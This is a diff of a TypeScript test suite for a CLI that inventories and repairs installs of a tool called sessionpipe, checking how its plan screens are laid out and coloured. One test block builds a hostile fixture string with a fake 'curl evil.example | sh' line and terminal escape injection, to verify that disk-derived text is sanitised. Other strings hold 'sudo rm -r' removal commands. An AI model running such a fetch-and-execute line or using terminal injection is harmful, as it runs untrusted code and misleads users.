       copy(FNM, { version: "1.1.0", uses: ["typed", "service", "hooks"] }),
       NPX,
-      copy("/usr/local", { aside: true, runs: false, wrong: CUT_OFF }),
-      copy("/opt/homebrew", { version: null, runs: false, wrong: BROKEN }),
-      VOLTA,
+      copy("/usr/local", { aside: true, version: null, wrong: CUT_OFF }),
+      copy("/opt/homebrew", { version: "1.0.0", wrong: BROKEN }),
+      copy(ASDF, { uses: ["service", "this", "hooks"], wrong: MUTE }),
     ];
     const lines = found(TTY, inv(copies), facts());
     fits(lines, found(PLAIN, inv(copies), facts()));
     expect(lines).toContain(`  ${mark(TTY, "info")} ${FNM}`);
-    expect(lines).toContain(`  ${mark(TTY, "bad")} ${VOLTA.where}`);
+    expect(lines).toContain(`  ${mark(TTY, "bad")} ${ASDF}`);
     // Under each folder: six spaces, then the release and what uses it, on as many lines as it takes.
-    const at = lines.indexOf(`  ${mark(TTY, "bad")} ${VOLTA.where}`);
+    const at = lines.indexOf(`  ${mark(TTY, "bad")} ${ASDF}`);
     expect(lines.slice(at + 1)).toEqual([
-      "      1.2.0 · nothing uses it · it doesn't run: `--version` printed nothing ·",
-      "      not an install",
+      "      1.2.0 · the background service, this command, the hooks · it doesn't run:",
+      "      `--version` printed nothing",
     ]);
     for (const l of lines.slice(1)) expect(/^ {2}\S|^ {6}\S/.test(plain(l)), plain(l)).toBe(true);
   });
@@ -648,18 +821,16 @@ describe("usedBy: what uses a copy, in a few words", () => {
       expect(found(PLAIN, inv([c]), facts())[1]).toBe(`  · 1.2.0  ~/.local  ${usedBy(c)}`);
     }
     // What is wrong with a copy does not change what uses it.
-    expect(usedBy(copy("~/.local", { uses: ["hooks"], runs: false, wrong: BROKEN, version: null }))).toBe("the hooks");
+    expect(usedBy(copy("~/.local", { uses: ["hooks"], wrong: BROKEN }))).toBe("the hooks");
   });
 });
 
 describe("planned: what will happen, a row an action", () => {
-  /** One of each kind of row, in the order a plan takes its steps. (No plan stops a
-   *  daemon and removes the service file both: the page shows what it is handed.) */
+  /** One of each kind of row, in the order a plan takes its steps. */
   const EACH: Step[] = [
     FETCH,
     install("1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)"),
     stop("the daemon started by hand (pid 222), once it holds nothing"),
-    unserve("the service file, which nothing here needs"),
     use("the hooks and the background service to it"),
     remove("/usr/local/bin/sessionpipe (a link to a copy that is gone)"),
     remove("a leftover folder in /usr/local"),
@@ -673,8 +844,6 @@ describe("planned: what will happen, a row an action", () => {
       "This will",
       "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)",
       "  ~ stop     the daemon started by hand (pid 222), once it holds nothing",
-      // Taking the service file away is a removal as any other.
-      "  - remove   the service file, which nothing here needs",
       "  ~ switch   the hooks and the background service to it",
       "  - remove   /usr/local/bin/sessionpipe (a link to a copy that is gone)",
       "  - remove   a leftover folder in /usr/local",
@@ -683,6 +852,55 @@ describe("planned: what will happen, a row an action", () => {
       "",
       SAFE,
     ]);
+  });
+
+  it("M3: a home copy that is not installed again is the first row: kept, in the plan's own words for it", () => {
+    const stays = "1.2.0 in /usr/local as it is: whole, the newest, and not yours to write";
+    const steps = [use("the hooks to it"), remove("1.1.0 in ~/.nvm/versions/node/v22.1.0"), PROVE];
+    expect(planned(PLAIN, aPlan({ stays, steps, safety: [RESTARTS] }))).toEqual([
+      "This will",
+      `  = keep     ${stays}`,
+      "  ~ switch   the hooks to it",
+      "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
+      KEEP,
+      "",
+      RESTARTS,
+    ]);
+    // It is a row as what is always kept is one: dim, and folded under its own words.
+    const coloured = planned(TTY, aPlan({ stays: `${stays}, as after \`sudo npm install -g\``, steps }));
+    expect(coloured.slice(1, 3)).toEqual([
+      `  ${tint(TTY, "dim", "= keep   ")}  1.2.0 in /usr/local as it is: whole, the newest, and not yours to`,
+      "             write, as after `sudo npm install -g`",
+    ]);
+    // Without it the first row is the first step's, and with nothing else to do the one row is what is always kept.
+    expect(planned(PLAIN, aPlan({ steps }))[1]).toBe("  ~ switch   the hooks to it");
+    expect(planned(PLAIN, aPlan({ stays, steps: [PROVE], safety: [] }))).toEqual([
+      "This will",
+      `  = keep     ${stays}`,
+      KEEP,
+    ]);
+  });
+
+  it("with nothing that keeps a run safe to say, the screen ends with its last row, list or note: no empty line, and no line after it", () => {
+    const stays = [left("~/code/sessionpipe", "it holds src")];
+    const notes = [
+      "The background service isn't running, and nothing here starts it by itself: `sessionpipe control run` does.",
+    ];
+    for (const ui of [PLAIN, MONO, TTY, WIDE]) {
+      expect(planned(ui, aPlan({ safety: [] })).map(plain)).toEqual(["This will", KEEP]);
+      // Whatever else is on it: the same screen as with a safety line, less the empty line and that line.
+      for (const over of [
+        {},
+        { left: stays },
+        { notes },
+        { left: stays, notes },
+        { steps: EACH, left: stays, notes },
+      ]) {
+        const safe = planned(ui, aPlan({ ...over, safety: [SAFE] }));
+        expect(safe.slice(-2)).toEqual(["", SAFE]);
+        expect(planned(ui, aPlan({ ...over, safety: [] }))).toEqual(safe.slice(0, -2));
+      }
+    }
   });
 
   it("the download and the check have no row, nor has a switch with nothing to switch; what is kept is always the last row", () => {
@@ -710,7 +928,7 @@ describe("planned: what will happen, a row an action", () => {
       const rows = planned(ui, aPlan({ steps: EACH }))
         .map(plain)
         .filter((l) => /^ {2}[+~=-] /.test(l));
-      expect(rows).toHaveLength(8);
+      expect(rows).toHaveLength(7);
       // Two spaces, the sign, the verb padded to the longest ("install"), two spaces.
       for (const r of rows) expect(r).toMatch(/^ {2}[+~=-] (install|switch |stop {3}|remove |keep {3}) {2}\S/);
       expect(new Set(rows.map((r) => r.search(/(?<=^ {2}[+~=-] \S+ +)\S/)))).toEqual(new Set([13]));
@@ -725,9 +943,8 @@ describe("planned: what will happen, a row an action", () => {
       `  ${ESC}[32m+ install${ESC}[39m  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)`,
       // Yellow: what is changed in place, a daemon stopped or the hooks and the service switched.
       `  ${ESC}[33m~ stop   ${ESC}[39m  the daemon started by hand (pid 222), once it holds nothing`,
-      // Red and bold: what goes. It is the row the eye should land on.
-      `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  the service file, which nothing here needs`,
       `  ${ESC}[33m~ switch ${ESC}[39m  the hooks and the background service to it`,
+      // Red and bold: what goes. It is the row the eye should land on.
       `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  /usr/local/bin/sessionpipe (a link to a copy that is gone)`,
       `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  a leftover folder in /usr/local`,
       `  ${ESC}[1m${ESC}[31m- remove ${ESC}[39m${ESC}[22m  1.1.0 in ~/.nvm/versions/node/v22.1.0`,
@@ -744,17 +961,17 @@ describe("planned: what will happen, a row an action", () => {
     };
     expect(verb(lines[1])).toBe(tint(TTY, "green", "+ install"));
     expect(verb(lines[2])).toBe(tint(TTY, "yellow", "~ stop   "));
-    expect(verb(lines[4])).toBe(tint(TTY, "yellow", "~ switch "));
-    expect(verb(lines[3])).toBe(tint(TTY, "bold", tint(TTY, "red", "- remove ")));
-    expect(verb(lines[8])).toBe(tint(TTY, "dim", "= keep   "));
+    expect(verb(lines[3])).toBe(tint(TTY, "yellow", "~ switch "));
+    expect(verb(lines[4])).toBe(tint(TTY, "bold", tint(TTY, "red", "- remove ")));
+    expect(verb(lines[7])).toBe(tint(TTY, "dim", "= keep   "));
     // Each code a row opens it closes before its words begin: the words are in no colour.
-    expect(lines.slice(1, 9).map((l) => codes(l).length)).toEqual([2, 2, 4, 2, 4, 4, 4, 2]);
-    for (const l of lines.slice(1, 9)) {
+    expect(lines.slice(1, 8).map((l) => codes(l).length)).toEqual([2, 2, 2, 4, 4, 4, 2]);
+    for (const l of lines.slice(1, 8)) {
       expect(l.slice(2 + verb(l).length)).toMatch(/^ {2}\S/);
       expect(codes(l.slice(2 + verb(l).length))).toEqual([]);
     }
     // Only a removal is bold, and nothing but a removal is red.
-    for (const l of lines.slice(1, 9))
+    for (const l of lines.slice(1, 8))
       expect([l.includes(`${ESC}[1m`), l.includes(`${ESC}[31m`)]).toEqual(
         plain(l).startsWith("  - remove ") ? [true, true] : [false, false],
       );
@@ -1005,7 +1222,7 @@ describe("planned: what will happen, a row an action", () => {
   it("the notes: each under its mark, a second line under its words, a command shown as one", () => {
     const notes = [
       "/home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not found when you type it.",
-      "Typing `sessionpipe` starts /home/u/bin/sessionpipe, not the copy in ~/.local.",
+      "Typing `sessionpipe` starts ~/code/sessionpipe, which is no installed copy of it.",
       "The background service isn't running, and nothing here starts it by itself: `sessionpipe control run` does.",
     ];
     // Into a pipe a note is the sentence as the plan wrote it.
@@ -1013,15 +1230,15 @@ describe("planned: what will happen, a row an action", () => {
     expect(planned(MONO, aPlan({ notes })).slice(3, -2)).toEqual([
       "  ! /home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not",
       "    found when you type it.",
-      "  ! Typing `sessionpipe` starts /home/u/bin/sessionpipe, not the copy in",
-      "    ~/.local.",
+      "  ! Typing `sessionpipe` starts ~/code/sessionpipe, which is no installed copy",
+      "    of it.",
       "  ! The background service isn't running, and nothing here starts it by itself:",
       "    `sessionpipe control run` does.",
     ]);
     // At 120 columns only the longest folds, and its command goes whole to the next line.
     expect(planned(MONO_WIDE, aPlan({ notes })).slice(3, -2)).toEqual([
       "  ! /home/u/.local/bin is not on your PATH: add it, or `sessionpipe` is not found when you type it.",
-      "  ! Typing `sessionpipe` starts /home/u/bin/sessionpipe, not the copy in ~/.local.",
+      "  ! Typing `sessionpipe` starts ~/code/sessionpipe, which is no installed copy of it.",
       "  ! The background service isn't running, and nothing here starts it by itself:",
       "    `sessionpipe control run` does.",
     ]);
@@ -1030,8 +1247,8 @@ describe("planned: what will happen, a row an action", () => {
     expect(coloured).toEqual([
       `  ${mark(TTY, "warn")} /home/u/.local/bin is not on your PATH: add it, or ${tint(TTY, "cyan", "`sessionpipe`")} is not`,
       "    found when you type it.",
-      `  ${mark(TTY, "warn")} Typing ${tint(TTY, "cyan", "`sessionpipe`")} starts /home/u/bin/sessionpipe, not the copy in`,
-      "    ~/.local.",
+      `  ${mark(TTY, "warn")} Typing ${tint(TTY, "cyan", "`sessionpipe`")} starts ~/code/sessionpipe, which is no installed copy`,
+      "    of it.",
       `  ${mark(TTY, "warn")} The background service isn't running, and nothing here starts it by itself:`,
       `    ${tint(TTY, "cyan", "`sessionpipe control run`")} does.`,
     ]);
@@ -1046,12 +1263,12 @@ describe("planned: what will happen, a row an action", () => {
       expect(lines.slice(-3)).toEqual(["", SAFE, RESTARTS]);
     }
     // A release with a long name: the line is longer than 80 columns, and goes on under its own start.
-    const long = "Nothing is touched until 10.20.30-beta.12 has downloaded. A failed install is undone.";
+    const long = "Nothing is touched until 10.20.30-beta.12.nightly has been downloaded and seen to run.";
     expect(cols(long)).toBeGreaterThan(79);
     expect(planned(TTY, aPlan({ safety: [long, RESTARTS] })).slice(-4)).toEqual([
       "",
-      "Nothing is touched until 10.20.30-beta.12 has downloaded. A failed install is",
-      "undone.",
+      "Nothing is touched until 10.20.30-beta.12.nightly has been downloaded and seen",
+      "to run.",
       RESTARTS,
     ]);
     expect(planned(WIDE, aPlan({ safety: [long, RESTARTS] })).slice(-3)).toEqual(["", long, RESTARTS]);
@@ -1059,14 +1276,14 @@ describe("planned: what will happen, a row an action", () => {
   });
 
   it("no command is printed on a line of its own: a copy that needs sudo says so, and a run ends with the line", () => {
-    const sudo = "sudo npm uninstall -g --prefix /usr/local sessionpipe";
+    const sudo = "sudo rm -r /usr/local/lib/node_modules/sessionpipe /usr/local/bin/sessionpipe";
     const stays = [
       left("/usr/local", "you may not write where it is", { version: "1.1.0", line: sudo, ours: true }),
       left("~/.volta", "Volta keeps it", { line: "volta uninstall sessionpipe" }),
     ];
     for (const ui of [PLAIN, MONO, TTY, WIDE]) {
       const lines = planned(ui, aPlan({ steps: EACH, left: stays })).map(plain);
-      expect(lines.join("\n")).not.toContain("sudo npm");
+      expect(lines.join("\n")).not.toMatch(/sudo (rm|npm)|node_modules/);
       expect(lines.join("\n")).not.toContain("This removes it");
       // What its keeper removes it with is said in the row, as words of the sentence.
       expect(lines).toContain("  · ~/.volta    Volta keeps it: `volta uninstall sessionpipe` removes it");
@@ -1078,7 +1295,7 @@ describe("planned: what will happen, a row an action", () => {
 });
 
 describe("leftAlone: what stays as it is, a row a thing", () => {
-  const SUDO = "sudo npm uninstall -g --prefix /usr/local sessionpipe";
+  const SUDO = "sudo rm -r /usr/local/lib/node_modules/sessionpipe /usr/local/bin/sessionpipe";
   /** One of each kind of thing that stays, every place short. */
   const EACH: Left[] = [
     // What is no install of it, and nobody's to remove.
@@ -1086,11 +1303,14 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
     // A copy this command would have removed, with the line that does it.
     left("/usr/local", "you may not write where it is", { version: "1.1.0", line: SUDO, ours: true }),
     // A file of the name that is no install.
-    left("/home/u/bin/sessionpipe", "a file of that name that npm didn't put there"),
+    left("/home/u/bin/sessionpipe", "a file npm didn't put there"),
     // What a tool of its own keeps, and removes.
     left("~/.volta", "Volta keeps it", { line: "volta uninstall sessionpipe" }),
-    // A copy that would have gone, with no line for it (Windows; npm's own leftover), and no release.
-    left("C:\\nodejs", "you may not write where it is", { ours: true }),
+    // A folder npm left behind where this user may not write: it would have gone, and names no release.
+    left("/opt/node", "you may not write where it is", {
+      line: "sudo rm -r /opt/node/lib/node_modules/.sessionpipe-Zz9Yy8Xx",
+      ours: true,
+    }),
     // npm's cache of what npx ran, beside a clean copy.
     left("~/.npm/_npx/0a1b2c3d4e5f6a7b", "npm's cache of what npx ran", { version: "1.2.0" }),
   ];
@@ -1106,9 +1326,9 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
       "  · ~/code/sessionpipe            it holds src, which no published sessionpipe has (a checkout or a build?)",
       // The command is not said here: a run ends with it, once, where it can be copied whole.
       "  ! /usr/local                    1.1.0 · needs sudo: a run ends with its line",
-      "  · /home/u/bin/sessionpipe       a file of that name that npm didn't put there",
+      "  · /home/u/bin/sessionpipe       a file npm didn't put there",
       "  · ~/.volta                      Volta keeps it: `volta uninstall sessionpipe` removes it",
-      "  ! C:\\nodejs                     a broken copy · you may not write where it is",
+      "  ! /opt/node                     a leftover · needs sudo: a run ends with its line",
       "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b  npm's cache of what npx ran",
     ]);
     // Each by itself, the column as wide as its own place.
@@ -1117,14 +1337,12 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
     expect(row(left("~/.volta", "Volta keeps it", { line: "volta uninstall sessionpipe" }))).toBe(
       "  · ~/.volta  Volta keeps it: `volta uninstall sessionpipe` removes it",
     );
+    // A copy of ours stays only where this user may not write: its release (a leftover
+    // folder names none), and that its line needs sudo. Why is the same for each, and not said.
     const ours = (over: Partial<Left>) =>
-      row(left("/usr/local", "you may not write where it is", { ours: true, ...over }));
-    expect(ours({ version: "1.1.0", line: SUDO })).toBe("  ! /usr/local  1.1.0 · needs sudo: a run ends with its line");
-    expect(ours({ version: null, line: SUDO })).toBe(
-      "  ! /usr/local  a broken copy · needs sudo: a run ends with its line",
-    );
-    expect(ours({ version: "1.1.0" })).toBe("  ! /usr/local  1.1.0 · you may not write where it is");
-    expect(ours({ version: null })).toBe("  ! /usr/local  a broken copy · you may not write where it is");
+      row(left("/usr/local", "you may not write where it is", { ours: true, line: SUDO, ...over }));
+    expect(ours({ version: "1.1.0" })).toBe("  ! /usr/local  1.1.0 · needs sudo: a run ends with its line");
+    expect(ours({ version: null })).toBe("  ! /usr/local  a leftover · needs sudo: a run ends with its line");
     // What is not ours says no release, whatever it is, and never "needs sudo".
     expect(row(left("~/code", "it holds src", { version: "9.9.9" }))).toBe("  · ~/code  it holds src");
   });
@@ -1133,7 +1351,7 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
     for (const ui of [PLAIN, MONO, TTY, WIDE]) {
       const text = leftAlone(ui, EACH).map(plain).join("\n");
       expect(text).not.toContain(path.join(ROOT, "whole"));
-      expect(text).not.toContain("sudo npm");
+      expect(text).not.toMatch(/sudo (rm|npm)|node_modules/);
     }
   });
 
@@ -1144,9 +1362,9 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
       "                                  build?)",
       // Yellow: the one kind of row that leaves the job unfinished.
       `  ${ESC}[33m!${ESC}[39m /usr/local                    1.1.0 · needs sudo: a run ends with its line`,
-      `  ${ESC}[2m·${ESC}[22m /home/u/bin/sessionpipe       a file of that name that npm didn't put there`,
+      `  ${ESC}[2m·${ESC}[22m /home/u/bin/sessionpipe       a file npm didn't put there`,
       `  ${ESC}[2m·${ESC}[22m ~/.volta                      Volta keeps it: ${ESC}[36m\`volta uninstall sessionpipe\`${ESC}[39m removes it`,
-      `  ${ESC}[33m!${ESC}[39m C:\\nodejs                     a broken copy · you may not write where it is`,
+      `  ${ESC}[33m!${ESC}[39m /opt/node                     a leftover · needs sudo: a run ends with its line`,
       `  ${ESC}[2m·${ESC}[22m ~/.npm/_npx/0a1b2c3d4e5f6a7b  npm's cache of what npx ran`,
     ]);
     expect(mark(WIDE, "info")).toBe(`${ESC}[2m·${ESC}[22m`);
@@ -1165,10 +1383,11 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
       "  · ~/code/sessionpipe            it holds src, which no published sessionpipe",
       "                                  has (a checkout or a build?)",
       "  ! /usr/local                    1.1.0 · needs sudo: a run ends with its line",
-      "  · /home/u/bin/sessionpipe       a file of that name that npm didn't put there",
+      "  · /home/u/bin/sessionpipe       a file npm didn't put there",
       "  · ~/.volta                      Volta keeps it: `volta uninstall sessionpipe`",
       "                                  removes it",
-      "  ! C:\\nodejs                     a broken copy · you may not write where it is",
+      "  ! /opt/node                     a leftover · needs sudo: a run ends with its",
+      "                                  line",
       "  · ~/.npm/_npx/0a1b2c3d4e5f6a7b  npm's cache of what npx ran",
     ]);
     fits(leftAlone(TTY, EACH), leftAlone(PLAIN, EACH), 80);
@@ -1201,9 +1420,9 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
   const WIDE_ROWS: Left[] = [
     left("~/code/sessionpipe", CHECKOUT, { version: "1.3.0" }),
     left(VOLTA_AT, "Volta keeps it", { line: "volta uninstall sessionpipe" }),
-    left("/home/u/bin/sessionpipe", "a file of that name that npm didn't put there"),
+    left("/home/u/bin/sessionpipe", "a file npm didn't put there"),
     left(LONG, "you may not write where it is", { version: "1.0.0", line: SUDO, ours: true }),
-    left("/usr", "you may not write where it is", { ours: true }),
+    left("/usr", "you may not write where it is", { line: SUDO, ours: true }),
   ];
 
   it("a place too long for a column: each kind of row with its place on a line of its own, and why under it", () => {
@@ -1214,12 +1433,12 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
       `  · ${VOLTA_AT}`,
       "      Volta keeps it: `volta uninstall sessionpipe` removes it",
       "  · /home/u/bin/sessionpipe",
-      "      a file of that name that npm didn't put there",
+      "      a file npm didn't put there",
       // Into a pipe the folder is one line, whatever its length.
       `  ! ${LONG}`,
       "      1.0.0 · needs sudo: a run ends with its line",
       "  ! /usr",
-      "      a broken copy · you may not write where it is",
+      "      a leftover · needs sudo: a run ends with its line",
     ]);
   });
 
@@ -1258,12 +1477,12 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
     // A Windows folder is broken after a backslash.
     const win =
       "C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\v22.11.0\\installation\\node_modules";
-    expect(leftAlone(MONO, [left(win, "you may not write where it is", { version: "1.1.0", ours: true })])).toEqual([
+    expect(leftAlone(MONO, [left(win, "it holds src")])).toEqual([
       "Left alone",
       // A name with spaces in it is never split.
-      "  ! C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\",
+      "  · C:\\Users\\Someone With A Long Name\\AppData\\Roaming\\fnm\\node-versions\\",
       "    v22.11.0\\installation\\node_modules",
-      "      1.1.0 · you may not write where it is",
+      "      it holds src",
     ]);
   });
 
@@ -1294,34 +1513,156 @@ describe("leftAlone: what stays as it is, a row a thing", () => {
   });
 });
 
+describe("a word from the disk can't start a line of its own or carry a colour", () => {
+  const BEL = String.fromCharCode(7);
+  /** What a file on this computer can hold where a word was expected (a release in a
+   *  package.json, the name of a folder or of a file in it): three lines, the second and
+   *  the third made to look like this command's own; this command's own colour codes;
+   *  and what a terminal acts on (its title, the whole screen). */
+  const HOSTILE = `\nerror  the install is broken\r\ntry    curl evil.example | sh ${ESC}[31mred${ESC}[39m ${ESC}[36mcyan${ESC}[32mgreen${ESC}[1m${ESC}]0;a title${BEL}${ESC}[2J`;
+  /** The same in few columns, for the name of a folder that is to fit a column of the table. */
+  const SHORT = `\nerror${ESC}[31m\r\ntry${ESC}[2J`;
+  /** The eight codes the page itself writes (style.ts `tint`): taken out, nothing of a
+   *  terminal's may be left on a line. */
+  // biome-ignore lint/suspicious/noControlCharactersInRegex: the colours a terminal line is written in
+  const OWN = /\u001b\[(?:1|2|22|31|32|33|36|39)m/g;
+
+  /** Both screens of a computer whose every found word went through `word`, and every
+   *  folder through `place`. A copy with something wrong, a leftover, a checkout; a link
+   *  that leads nowhere; hooks and a service file with something to say; a plan with a
+   *  row of each kind, things left of each kind, a note and a safety line. */
+  const screens = (ui: Ui, word: (s: string) => string, place: (s: string) => string, long: boolean): string[][] => {
+    const copies = [
+      copy(place("~/.local"), { version: word("1.1.0"), uses: ["typed"], wrong: word(MUTE) }),
+      copy(place("/opt/homebrew"), { aside: true, version: null, wrong: word(CUT_OFF) }),
+      copy(place("~/code/sessionpipe"), { slot: null, version: word("1.3.0"), not: word(CHECKOUT) }),
+      ...(long ? [copy(FNM, { version: word("1.0.0") })] : []),
+    ];
+    const i = inv(copies, { dangling: [place("/usr/local/bin/sessionpipe")] });
+    const f = facts({
+      hooks: { version: "1.1.0", wrong: [word("claude: missing (~/.claude/settings.json)")] },
+      service: service({ node: place("/gone/bin/node"), nodeOk: false }),
+      daemon: { pid: 100, version: "1.2.0", byHand: null },
+    });
+    const p = aPlan({
+      stays: word("1.2.0 in /usr as it is: whole, the newest, and not yours to write"),
+      steps: [
+        FETCH,
+        install(word("1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)")),
+        stop(word("the daemon started by hand (pid 222), once it holds nothing")),
+        use(word("the hooks to it")),
+        remove(word("1.1.0 in ~/.nvm/versions/node/v22.1.0")),
+        PROVE,
+      ],
+      left: [
+        left(place("~/code/sessionpipe"), word(CHECKOUT)),
+        left(place("/usr/local"), "you may not write where it is", {
+          version: word("1.1.0"),
+          line: "sudo rm",
+          ours: true,
+        }),
+        left(place("~/.volta"), word("Volta keeps it"), { line: word("volta uninstall sessionpipe") }),
+        ...(long ? [left(FNM, word("it holds src"))] : []),
+      ],
+      notes: [word("The background service isn't running, and nothing here starts it by itself.")],
+      // The one word of a safety line that is not this command's own is the release.
+      safety: [SAFE.replace("1.2.0", word("1.2.0")), RESTARTS],
+    });
+    return [found(ui, i, f), planned(ui, p), leftAlone(ui, p.left)];
+  };
+  const asIs = (x: string): string => x;
+  /** How a screen is laid out: its headings, and what each row starts with. */
+  const laidOut = (lines: string[]): string[] =>
+    lines
+      .map(plain)
+      .filter((l) => /^(Found|Also found|This will|Left alone)\b|^ {2}\S/.test(l))
+      .map((l) => (l.startsWith(" ") ? l.slice(0, 4) : l));
+
+  for (const [layout, long] of [
+    ["every folder short enough for its column", false],
+    ["a folder too long for a column, so each has a line of its own", true],
+  ] as const)
+    it(`L3: ${layout}: each screen is the screen of the same words with nothing in them a terminal acts on`, () => {
+      const dirty = (x: string): string => `${x}${HOSTILE}`;
+      const there = (x: string): string => `${x}${long ? HOSTILE : SHORT}`;
+      for (const ui of [TTY, WIDE, MONO, MONO_WIDE, PLAIN]) {
+        const got = screens(ui, dirty, there, long);
+        // The words as they would be had the disk held nothing but text: line for line the same.
+        const want = screens(
+          ui,
+          (x) => clean(dirty(x)),
+          (x) => clean(there(x)),
+          long,
+        );
+        expect(got).toEqual(want);
+        // And laid out as they are with no such thing in them at all: the same headings,
+        // and the same rows under each, a mark or a sign for a mark or a sign.
+        const calm = screens(ui, asIs, asIs, long);
+        expect(got.map(laidOut)).toEqual(calm.map(laidOut));
+        for (const lines of got) {
+          // One entry is one line of the screen: no break inside it starts another.
+          for (const l of lines) expect(l).not.toMatch(/[\r\n]/);
+          // No line reads as this command's own failure or its next step: those two start
+          // a line, in its first column.
+          for (const l of lines) expect(plain(l)).not.toMatch(/^(error|try)\b/);
+          // Nothing of a terminal's is left: no title, no cleared screen, no code but the page's own.
+          const text = lines.join("\n");
+          expect(text.replace(OWN, "")).not.toContain(ESC);
+          expect(text).not.toContain(BEL);
+          if (!ui.color) expect(text).not.toContain(ESC);
+        }
+        // The words themselves are all still there, as words: nothing was dropped to hide
+        // them. Every found word is on the screens once (the three screens hold 19 of them,
+        // and 13 more where the folders carry the long one too).
+        const all = got.flat().map(plain).join(" ").replace(/\s+/g, " ");
+        expect(all.match(/curl evil\.example \| sh red cyangreen/g)).toHaveLength(long ? 32 : 19);
+        expect(all).toContain(long ? ".local error the install is broken try curl" : "~/.local error try ");
+      }
+    });
+
+  it("L3: a colour of this command's own in a found word colours nothing: each line has the codes it has without it", () => {
+    const red = (x: string): string => `${ESC}[31m${x}${ESC}[39m${ESC}[1m`;
+    for (const long of [false, true])
+      for (const ui of [TTY, WIDE]) {
+        const got = screens(ui, red, red, long);
+        expect(got).toEqual(screens(ui, asIs, asIs, long));
+        // Red is the mark of a copy with something wrong and the verb of a removal, and nothing else.
+        const reds = got.flat().filter((l) => l.includes(`${ESC}[31m`));
+        expect(reds.map((l) => plain(l).trim().slice(0, 1))).toEqual(["✗", "✗", "-"]);
+      }
+  });
+});
+
 describe("the two screens of a real repair, from the plan itself", () => {
-  // A computer with every kind of copy on it and a copy that can't be written; the
-  // home's bin folder is not on PATH, and what a shell finds first is a file that is no
-  // install. A service file is there, and a daemon someone started by hand answers.
-  const copies = [...SEVERAL, VOLTA, copy("/usr", { version: "1.0.0", prefix: "/usr", writable: false })];
+  // A computer with every kind of copy on it and a copy that can't be written. Typing
+  // `sessionpipe` starts the copy in ~/.local through npm's link; a file of the name that
+  // is no install is behind it on PATH. A service file is there, and a daemon someone
+  // started by hand answers. The command runs from npx's cache.
+  const copies = [
+    ...SEVERAL,
+    VOLTA,
+    copy("/usr", { version: "1.0.0", writable: false, bins: [path.join(folder("/usr"), "bin", "sessionpipe")] }),
+  ];
+  const typed = copies[0] as Copy;
   const i = inv(copies, {
     dangling: ["/usr/local/bin/sessionpipe"],
-    strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file of that name that npm didn't put there" }],
-    onPath: [{ file: "/home/u/bin/sessionpipe", dir: null, at: 0 }],
-    homes: [
-      {
-        prefix: LOCAL,
-        shown: "~/.local",
-        why: "where the one you type is",
-        bin: path.join(LOCAL, "bin"),
-        pathAt: null,
-        blocked: null,
-      },
+    strangers: [{ file: "/home/u/bin/sessionpipe", why: "a file npm didn't put there" }],
+    onPath: [
+      { file: path.join(LOCAL, "bin", "sessionpipe"), dir: typed.dir },
+      { file: "/home/u/bin/sessionpipe", dir: null },
     ],
+    typed: typed.dir,
+    home: home("~/.local"),
   });
   const f = facts({
     hooks: { version: "1.1.0", wrong: [] },
     service: service(),
-    daemon: { pid: 222, version: "1.1.0" },
+    daemon: { pid: 222, version: "1.1.0", byHand: null },
   });
   const p = plan(i, f);
 
-  it("the plan has a step of every kind but the removal of the service file, things left of each kind, and two notes", () => {
+  it("the plan has a step of every kind, things left of each kind, and both safety lines", () => {
+    expect(p.refuse).toBeNull();
     expect(p.steps.map((s) => s.do)).toEqual([
       "fetch",
       "install",
@@ -1340,11 +1681,12 @@ describe("the two screens of a real repair, from the plan itself", () => {
       ["/home/u/bin/sessionpipe", false, false],
       ["/usr", true, true],
     ]);
-    expect(p.notes).toHaveLength(2);
+    expect(p.stays).toBeNull();
+    expect(p.notes).toEqual([]);
     expect(p.safety).toEqual([SAFE, RESTARTS]);
   });
 
-  it("into a pipe: the rows, what is left alone, the notes, what keeps it safe", () => {
+  it("into a pipe: the rows, what is left alone, what keeps it safe", () => {
     expect(planned(PLAIN, p)).toEqual([
       "This will",
       "  + install  1.2.0, the newest release, fresh in ~/.local (replaces 1.1.0)",
@@ -1352,7 +1694,7 @@ describe("the two screens of a real repair, from the plan itself", () => {
       "  ~ switch   the hooks and the background service to it",
       "  - remove   /usr/local/bin/sessionpipe (a link to a copy that is gone)",
       "  - remove   a leftover folder in /usr/local",
-      "  - remove   the broken copy in /opt/homebrew",
+      "  - remove   1.0.0 in /opt/homebrew",
       "  - remove   1.1.0 in ~/.nvm/versions/node/v22.1.0",
       "  - remove   1.2.0 in ~/.npm/_npx/0a1b2c3d4e5f6a7b",
       "  = keep     pairings, settings, keys, messages waiting to be sent",
@@ -1363,35 +1705,52 @@ describe("the two screens of a real repair, from the plan itself", () => {
       "  · ~/.volta/tools/image/packages/sessionpipe",
       "      Volta keeps it: `volta uninstall sessionpipe` removes it",
       "  · /home/u/bin/sessionpipe",
-      "      a file of that name that npm didn't put there",
+      "      a file npm didn't put there",
       "  ! /usr",
       "      1.0.0 · needs sudo: a run ends with its line",
-      "",
-      ...p.notes.map((n) => `  ! ${n}`),
       "",
       SAFE,
       RESTARTS,
     ]);
-    expect(p.notes[1]).toBe("Typing `sessionpipe` starts /home/u/bin/sessionpipe, not the copy in ~/.local.");
   });
 
-  it("why a folder is no install is said once, on its row of what is left; the table says only that it is none", () => {
-    const table = found(PLAIN, i, f).join("\n");
